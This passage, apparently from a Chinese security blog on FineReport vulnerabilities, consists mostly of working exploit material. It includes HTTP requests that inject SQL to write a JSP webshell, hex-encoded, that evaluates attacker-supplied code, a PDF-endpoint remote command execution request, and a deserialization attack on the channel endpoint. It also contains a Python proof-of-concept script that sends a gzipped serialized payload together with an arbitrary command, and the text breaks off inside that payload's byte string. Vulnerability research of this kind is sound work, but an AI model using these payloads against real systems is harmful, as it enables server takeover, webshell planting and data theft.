+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">webroot</span><span class="o">/</span><span class="n">decision</span><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">ReportServer</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">s</span><span class="o">&amp;</span><span class="n">n</span><span class="o">=</span><span class="n">$</span><span class="p">{</span><span class="n">__fr_locale__</span><span class="o">=</span><span class="n">sql</span><span class="p">(</span><span class="err">&#39;</span><span class="n">FRDemo</span><span class="err">&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">%</span><span class="n">EF</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BFATTACH</span><span class="o">%</span><span class="n">20DATABASE</span><span class="o">%</span><span class="n">20</span><span class="o">%</span><span class="n">27</span><span class="p">..</span><span class="o">%</span><span class="n">2Fwebapps</span><span class="o">%</span><span class="n">2Fwebroot</span><span class="o">%</span><span class="n">2Faaa</span><span class="p">.</span><span class="na">jsp</span><span class="o">%</span><span class="n">27</span><span class="o">%</span><span class="n">20as</span><span class="o">%</span><span class="n">20gggggg</span><span class="o">%</span><span class="n">3B</span><span class="err">&#39;</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">1</span><span class="p">))}</span><span class="n">$</span><span class="p">{</span><span class="n">__fr_locale__</span><span class="o">=</span><span class="n">sql</span><span class="p">(</span><span class="err">&#39;</span><span class="n">FRDemo</span><span class="err">&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">%</span><span class="n">EF</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BFCREATE</span><span class="o">%</span><span class="n">20TABLE</span><span class="o">%</span><span class="n">20gggggg</span><span class="p">.</span><span class="na">exp2</span><span class="o">%</span><span class="n">28data</span><span class="o">%</span><span class="n">20text</span><span class="o">%</span><span class="n">29</span><span class="o">%</span><span class="n">3B</span><span class="err">&#39;</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">1</span><span class="p">))}</span><span class="n">$</span><span class="p">{</span><span class="n">__fr_locale__</span><span class="o">=</span><span class="n">sql</span><span class="p">(</span><span class="err">&#39;</span><span class="n">FRDemo</span><span class="err">&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">%</span><span class="n">EF</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BFINSERT</span><span class="o">%</span><span class="n">20INTO</span><span class="o">%</span><span class="n">20gggggg</span><span class="p">.</span><span class="na">exp2</span><span class="o">%</span><span class="n">28data</span><span class="o">%</span><span class="n">29</span><span class="o">%</span><span class="n">20VALUES</span><span class="o">%</span><span class="n">20</span><span class="o">%</span><span class="n">28x</span><span class="o">%</span><span class="n">27247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d</span><span class="o">%</span><span class="n">27</span><span class="o">%</span><span class="n">29</span><span class="o">%</span><span class="n">3B</span><span class="err">&#39;</span><span class="p">,</span><span class="n">1</span><span class="p">,</span><span class="n">1</span><span class="p">))}</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">target</span><span class="p">.</span><span class="na">com</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span><span class="w"> </span><span class="n">max</span><span class="o">-</span><span class="n">age</span><span class="o">=</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">126</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">keep</span><span class="o">-</span><span class="n">alive</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/12.png"
+	width="1115"
+	height="856"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/12_hu_5948d42d4c2a4c16.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/12_hu_9205a66aa407694d.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="130"
+		data-flex-basis="312px"
+	
+></p>
+<h4 id="帆软pdf接口远程命令执行漏洞">帆软pdf接口远程命令执行漏洞
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /decision/nx/report/v9/print/ie/pdf HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Referer: http:///decision/view/ReportServer?test=s&amp;n=${ENV_HOME}
+</span></span><span class="line"><span class="cl">sessionID: ${7*9}
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">webroot</span><span class="o">/</span><span class="n">decision</span><span class="o">/</span><span class="n">nx</span><span class="o">/</span><span class="n">report</span><span class="o">/</span><span class="n">v9</span><span class="o">/</span><span class="n">print</span><span class="o">/</span><span class="n">ie</span><span class="o">/</span><span class="n">pdf</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="p">{{</span><span class="n">TARGET</span><span class="p">}}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">X11</span><span class="p">;</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">108</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">sessionID</span><span class="p">:</span><span class="w"> </span><span class="n">$</span><span class="p">{</span><span class="n">__fr_locale__</span><span class="o">=</span><span class="n">sql</span><span class="p">(</span><span class="err">&#39;</span><span class="n">FRDemo</span><span class="err">&#39;</span><span class="p">,</span><span class="n">DECODE</span><span class="p">(</span><span class="err">&#39;</span><span class="o">%</span><span class="n">EF</span><span class="o">%</span><span class="n">BB</span><span class="o">%</span><span class="n">BFATTACH</span><span class="w"> </span><span class="n">DATABASE</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">..</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="n">webroot</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="na">txt</span><span class="err">&#39;&#39;</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">t</span><span class="p">;</span><span class="n">CREATE</span><span class="w"> </span><span class="n">TABLE</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="nf">VARCHAR</span><span class="p">(</span><span class="n">255</span><span class="p">));</span><span class="n">INSERT</span><span class="w"> </span><span class="n">INTO</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="n">VALUES</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="n">FineReport</span><span class="w"> </span><span class="n">RCE</span><span class="w"> </span><span class="n">Test</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Success</span><span class="o">!</span><span class="err">&#39;&#39;</span><span class="p">);</span><span class="err">&#39;</span><span class="p">))}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14.png"
+	width="2560"
+	height="1042"
+	srcset="/p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14_hu_1ac49d453cb982a0.png 480w, /p/%E5%B8%86%E8%BD%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14_hu_7296c47f74508218.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251130214420240"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="245"
+		data-flex-basis="589px"
+	
+></p>
+<h4 id="帆软channel反序列化">帆软channel反序列化
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /webroot/decision/remote/design/channel HTTP/1.1
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Host: 
+</span></span><span class="line"><span class="cl">cmd: id
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{{gzip(file(fine10.bin))}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>漏洞poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import requests
+</span></span><span class="line"><span class="cl">import sys
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 检查参数数量
+</span></span><span class="line"><span class="cl">if len(sys.argv) &lt; 3:
+</span></span><span class="line"><span class="cl">    print(&#34;Usage: python3 poc.py &lt;target_url&gt; &lt;command&gt; [proxy_url]&#34;)
+</span></span><span class="line"><span class="cl">    print(&#34;Example: python3 poc.py http://192.168.1.100 whoami http://127.0.0.1:8080&#34;)
+</span></span><span class="line"><span class="cl">    sys.exit(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">url = sys.argv[1].rstrip(&#39;/&#39;)  # 自动去除末尾斜杠
+</span></span><span class="line"><span class="cl">cmd = sys.argv[2]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 可选：第三个参数为代理
+</span></span><span class="line"><span class="cl">proxies = None
+</span></span><span class="line"><span class="cl">if len(sys.argv) &gt; 3:
+</span></span><span class="line"><span class="cl">    proxy_url = sys.argv[3]
+</span></span><span class="line"><span class="cl">    proxies = {
+</span></span><span class="line"><span class="cl">        &#39;http&#39;: proxy_url,
+</span></span><span class="line"><span class="cl">        &#39;https&#39;: proxy_url
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">headers = {
+</span></span><span class="line"><span class="cl">    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0&#39;,
+</span></span><span class="line"><span class="cl">    &#39;cmd&#39;: cmd
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">target_url = url + &#34;/webroot/decision/remote/design/channel&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">data = b&#39;\x1f\x8b\x08\x087@\xf9d\x00\x03fine10.bin\x00\x8dX{t\x14\xd5\x19\xff\xdd\xd9\xc7L6\x9b\xd7j\x02\x0b\x8a\x12\x11\x93h6 \nu\x83\n\t\x01V\x92\x80$BC\xb4\xe9d3IF6\xb3\xcb\xec,I\xacR\xa5\xda\xd6\x16\xed\xcb\xfa\xa0\xb6Z\xab\xa6VZ\x01i\x12E)\xb6\xf5Qk\xb5/\xfb\xf0\xd1c\xdbc\xff\xb3\xa7===\xc7Z\x94\xfe\xee\xccJ6!x\x9a\xec\xd9;\xf7\xbb\xf7\xfb\xbe{\x7f\xdfsv\xdf;\x08dm\xcc\xb9V\xdf\xa9\xc7r\x8e\x99\x8am\xb2\xcd\xb4m:\xa3W\xe6\x8c\x9cq\xc7kK\x0e\xfd\xf7\xf2\xdd\x07|P\x12\xf0g\xcd\xeb\x8cV\x84\x92\xe9\xa1\x8cn\xebN\xdavP\xd5*9\x1b$gC\xf3\tz\xe3H\x06\x80B\xc1\xe7\xa7\xed\x81\x98\x9e\xd1\x93\x83F\x8c|Ci+\x1b\xeb5tK2dcM|\x9a\xe2z\xe5v\xb1\xfb\x83\xf6\x7f\xeeR\xa0L\xd3\xb2\x03\xbb Z\xa1e\xect\xc6\xb0\x9dQ\x07\x11OkJ\xb7\x06\x1a:\x1c\xdb\xb4\x06\xa8\x91\xda\xea\xdckHr\xcc#/j\xd6\xb3F\xc2\xca\x1aV\xd6t\xcc\x9d\xc6\x94\xb2a\xdf\xd57\\\xbd\xe9\xed\x97\x15`$\xe3\xa0&lt;\x9ds29g\x93\xa7\xc24\xb2\xc3~\xde\xc0G\x99q\x1e$\x96\xcdY\xb1\x82\x9b\x8c\xe8\xd4\x113-\xc7\xb0-=\x15\x1b\xc9\xa6\x9cd\xcc\xb1\xf5\x91X\xa71\x94I\xe9\x8e\x91Mp,\xda\xba\xf1\x19k\xdf\xa3\xcb|\x08&amp;P\xd2cZ}\x86\xe5\xb4\xe7\x86z\r;\x81\xd2\x1e2X\xd9\x94\xe1$H\x1f\xe9F\xa8\xa7w\xd41\x92\xe9&gt;#\xeb\xc0\xd7\xdd\xdd\xd4\x8d`O2\xa5g9\x8dt\x17\xdc\xb8Y\xd2\x1a[\x11\xe8\xb1\xf4!C\xa2\xe3oEE\xcf\xcc\x1bL7\xce\x14\xdd3\x8e\xfb\x97\xb3]E\x1b\xde\x8fV\x0e\x0c\xbc\xbe\xc2\xc5B\x1a\x8et\xa5\xbbi\xdf\xbf\xe6\xbc\x1b\xd4:\xdf\xca\x93\xcb\xde|\xf1\x83\&#39;\x8fpy)\xfe,PG8\x1a&lt;8\x1aR\xe9\x81\x01\x82\xed\x9enY\x83c\x8c8\xd2*\x9d\xe9\xed\x86E\x8f\xb1U\x08\x81\xf2\xa9\xf3o\xec\xbd\xd6H:*|\x02\xc1\x95\xa6e:\x97\t\xf8jj\xb7\x08\xf8\x9by{\x81\xb2V\xd32&lt;\x9c:\xf5\xde\x94\x11F\x00\xc1\x10\xfc(\x12\x10;\x04\x96\xd5\x9cl\xffZ\x8fd\xa6\x1b\x9a\x88\xe2j\xdb\xd6G7\xba\x80p\xdd\xd0\x87\x1a\x05Tc\xc4H6\x0f\xf5\x85Q\x82p\x08\nJ\x05\xb4\x95\xc9T\xfe\x04\x0b\xa6D\xb6\xa7;r\xc9\xc1\xb5\xa6\x91\xeak\x19I\x1a\x19\xc7L[**\x04\xce\x9a\xb9\xa7\xcdp\x06\xd3\x85\x9bN\x138mjS\xc1B\xa5@\xe5\xd4B\xe7 \x0f\xd5\xb7\xceN\xe72*\xe6L[r\xad\xdb\x9a\xd6\xfb$pQ\xe1\x85\xa6\xb7d\x1b\xfd)&#34;\xd7\xe0\x9eL\xc5|\xea*\xf4\x0bOh\xa3\x8a3\xa7\xc1\xed\x91U\x9c5\x8d\xea\xc1\xa6b\xa1@\xe9\x94\x97\xb4\x9aY\x1a\xe6\x1c\x813?\x12M\x15\xe7\n\x94t8zr{\x9b\x9eqm\xc4y2g\xdbtpO\x9f\xc0\xe95\xb5\&#39;\x1f.\x8c\x1a\xd4\x86p6\xea\xa8w\xc0p\n\x80\x10\x88\xce\xc2\xe1.\x91\xed\x02\xd4K\xb6\x18\xb1&#34;[s\xda\x92nV\x80\xd5L\xee\x82%r/\xc1R\xc9}!-.\xb9\xe5\x1a\xc1;\x99\x81[/\xc2\xc5\xd2\xd5\x96\xd3a\x1c\xf7\x04Y\r\x1f\xa3O\xce\xd8\xa9&#34;N&lt;)l\x8d\xc1\x18\xb5\x8d&gt;\xd7(\x02\xf5\xa7\xf6\xcd\x93mHu+qi\x08\x8d\xa0\x03\x96d\rgu2id\xb3\xa6\x8b\xa7\xbff[\xed\x960Vau\x08g\xa0\x891Bm\x02\x8b\x0b\x15x\xa14MA\x9e\x14\xc6\x1a\xb4H\xc6\xb5\xbc\x08\x19\xdb\x99*f\xda$\x7f\xbc0\xd6#!\xe1\xb9\x82Je\x90hh%PIb\xac\x9b\x16\x81\x9a_\xa8\xb2yP\xb7;\x8c\x1d9\xc3J\x1a\x8d\xb5\xdb\xc2h\xc7\xc6\x10\xaa\xb1\x89\xcc\x83\x8e\x93\xd1\xb0\x99q\xed\xe86\x95j\xe8\x14\x88L\xf1n\xceY\x96t\x16\x15[\xe4\x9eA3\xbbh\x89\x86\x8f\xf3\x84\x83\xba\xd5\x972l\r\xdb\x08\x049;r\xccVn\xf2\x0b\xe3ji\x91F\\C\x96\x81T\xbaWOi\xe8\x11\x08\xb1\x1cH\xb0\xd26\r\xa4\x0b\xaf:\xb9\x89$\x11F\x12}\xc5X\x04\xce+k\x12\xa7@g@\xee\x18$\x87m\xec\xd0p\xad@1\xf5n6\xb2\x19\xd6(CCJ\xa0\x88\x04/\xc2\x05V\xcdb\xd7\x93\x93\xf2l\x96\xf6$P\xa5\x85\xb4\xbc\x07\x1d}\xee\xa9v\xa9\xa0#\x07Mk\&#39;s\xa7\xc0%\xb3\x98\xba\xfb\xff\xb4\xbe\x83\\\x08Y\xec\xf4n\xb1\xde\x90\x81\xa0a\x84\xb85\xb7\xad\xe9Y\xdf\xb2zM\x0b\xed4K!\r\xe3:|\xaa\x88\xe9\xf1z\x9a\xc5\xcc\xb6\x0ce\x9cQ\x17V\x9az\x17&gt;-M}#\x85\xd2Y\x19\xffN\x8e\xe0\xef\x16\xa8\x98\x12\x93`d\x0e\xc8\xdcu3m\xd2\xd9\xb5\xa9\x85\xab\xb3\x84\xd9g\xf1\xb9&#34;\xdc\x82\xcfK?OH?\x0f\xe0\x0b!\x12\xbe\x18F\xb1\x97\x9eo\x13XTPs\x9d\xf4PRw\xbc\x1e\xa57\xd7\x1f\x93\x89\xa9y0gm\xd7\xf0%\x9e\xb4?m{.~\xe9,\x86\xdav\x8a\xc40[\xfc\x7f\x05_\x95V\xfa\x1a\xfd\xc12\x86\xd9;8:=}f\xe8\x9c\xc0\xf9\xeb\xb8Sn\xbf\x8b\x01CH\xe4\xa1\x88\xc8=B\xd6O\x15\xdf\xe0\xdd\x0bR\x84g\xe30\xbe\xe99\xc2\xb7\xa8\xc2I\x9fH\xb0\x12\x89\xda\xee\xa60\xee\xc7\xb7CX\x8c\x07x\xab\x9dz*gl\xec\x17\xa8\x9a\xee\xc6y\x90\xa9\xffA&lt;$a{\x98\x9b\xfb\xd2[\xd9\xb8\xd1u\xbf\x9b/B1\xcbL\xbb85\xe5\xfa\xfb\xa5\xf9\xbfG\x1d\xc3\xb6\xce\x18\xdd7\xa3v\xe4\x81R\xf1\x83\x0f\x0b\x18s\x7f\xc2*\xc8\xf8\xfb\xa9!\x9d\x8d\xc9\x96C\xc3\xc1\xe9\xb5d4\xeb\x18\xdcr\xc8\x8b\xa1|\xab1:#W\xcd\x92\x0cO\xb8\xdc8&amp;B\xf8!&amp;]DZ\xd3\xc3\x86-\x1b\xb70\x9e\x94\x89\xa9\x1a\x87\xe9\x80\xc3\xa6\xa5\xe1i&gt;$\x87\xfa4\xfc\x88\x0870Q=CWl\xe85\xad\x86^=;\xa8\xe1\&#39;$\xd7\x93\xfc\xec4\x97d\xdaq\xcc!f\x9d\xe7\xe9\xfe2\xc8\xbd\xb9L\x0e\x85\xa7\xc9\x93y\x9c\x9f\xe1\xc5\x10^\xc0\xcf\x05jjfA\xa9\x90i\x93\x97\x85\xc8\xd4\x8a_H\xa6\x97\xa7\xa9\xce/\xab\xf8\xa5W\xef\n ei\xaf\x99\xeaZ\n\x16(\xeb\xd7\xf8M\x08\xbf\xc2o\xa5\x1f\xb0\xe9\t\x0cK\xc3\xd2\x005\xddM\t7Z~\x8f?\xc8\xb5?\xd2\xa0^\xb5\rpIf\xbe\xd7\xf1F\x08\x07\xf0&amp;o\xda\x91\xce\xd9Ic\xad)\x8bIY\xa7\x1b&gt;-\xc9\xc1tL\xaa\xc4BF\x98lq\x89\x9f\x0cx&gt;\xf9\xf9\xcc&gt;\x8b\xdf*ggr\x14\x1c\x03u\x13\x08\x1dp7j\xfc\x0e\xba\xc4 \x99\x18\xa5\xf9\xad\x15\&#39;\xb6N\xa2l\xbf\xdbXj(\xffP\x92\xff\x10g\x15l*\x9f\x8a\x1c}\x1c7\xf8\x1a\&#39;q\xfe8\x1aZ\xddaY\x1b\xbfVD.\x19\xc7\xe5\xed\xf5\xfeq4\xd7s\xbe\xee(\x16\xf0\x13\xf7\xfb\x96\x07*\x03Q\xff\x91\x07\x94]Q\x7fe\xe0\xc2x0\x1a|\x1e\xc11\xc5\x8c\x06\xc7\xb1!\xaeF\xd5H\xdb8\xae\xdc\x8b\x12&gt;u\xb8O\\\xdd WWD\xae\x9a\x12*\t\xeb\xe2ZT{\x06[\xdd-5QMn\xe9*\xd8\xa2\xe5\xb7Hz\xb7\xa4\x8f\xa1*^\xe4\xce\xc7\xf1\t~&lt;\xea\xc9\xbb\xe5\xd2\&#39;=\x86\xf2&lt;\x837\x9fEp\xef\x0c\xfaQ,\xe2\&#39;^\xe4[\x1e\xaa\x0cE\x8b\x9e\x00C\xfd\x01\xb1+ZT\x19z\x02\xa6\x82xq\xb4X\xf2m/\xe0+\x96\xf2\xc2\xd1\xb0\xa4\x0f\xf9\x9eF\xe38vD\xc3|\xe0\xf2p\xbc\xc4[\x18\xf5s\xa1\xcb\x17\xa9\xeepW9\xf3w\xf9\x0e\xe2\x06N\x87\x8f\xa2ZB\xf7\x9c(\x8a\xaa\xe3\xb8i\xaf\x10\xd1\x12\xc9\xf3\x19\x8f\xe7 